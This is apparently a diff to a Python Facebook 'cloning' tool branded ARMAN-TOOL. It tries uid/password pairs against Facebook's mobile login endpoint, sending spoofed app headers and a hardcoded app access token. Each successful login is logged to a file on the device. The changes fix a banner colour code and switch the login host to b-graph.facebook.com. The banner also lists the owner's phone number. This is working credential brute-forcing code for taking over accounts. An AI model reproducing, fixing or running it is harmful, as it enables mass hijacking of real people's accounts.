@@ -398,7 +398,7 @@ def show_branding():
       "  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|\n")░\033[0m""")
                
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97ARSALAN")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARSALAN")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAP    \x1b[38;5;46m▶  \033[1;97m03202271931")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
@@ -605,9 +605,9 @@ def login_1(uid):
                 'sim_country': 'PK',
                 'network_country': 'PK'
             }
-            # Updated with new exact headers from HttpCanary & Host hdr.fb.com
+            # Host restored to b-graph.facebook.com
             headers = {
-                'Host': 'hdr.fb.com',
+                'Host': 'b-graph.facebook.com',
                 'User-Agent': 'Facebook',
                 'Accept-Encoding': 'gzip, deflate',
                 'X-FB-HTTP-Engine': 'Tigon/Liger',
@@ -619,7 +619,7 @@ def login_1(uid):
                 'x-fb-conn-uuid-client': 'sbQ1GdhKzcTild6k56CNYA==',
                 'Connection': 'keep-alive'
             }
-            res = session.post('https://hdr.fb.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
@@ -642,7 +642,7 @@ def login_2(uid):
         try:
             with requests.Session() as session:
                 headers = {
-                    'Host': 'hdr.fb.com',
+                    'Host': 'b-graph.facebook.com',
                     'User-Agent': 'Facebook',
                     'Accept-Encoding': 'gzip, deflate',
                     'X-FB-HTTP-Engine': 'Tigon/Liger',
@@ -654,7 +654,7 @@ def login_2(uid):
                     'x-fb-conn-uuid-client': 'sbQ1GdhKzcTild6k56CNYA==',
                     'Connection': 'keep-alive'
                 }
-                url = f"https://hdr.fb.com/auth/login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                url = f"https://b-graph.facebook.com/auth/login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
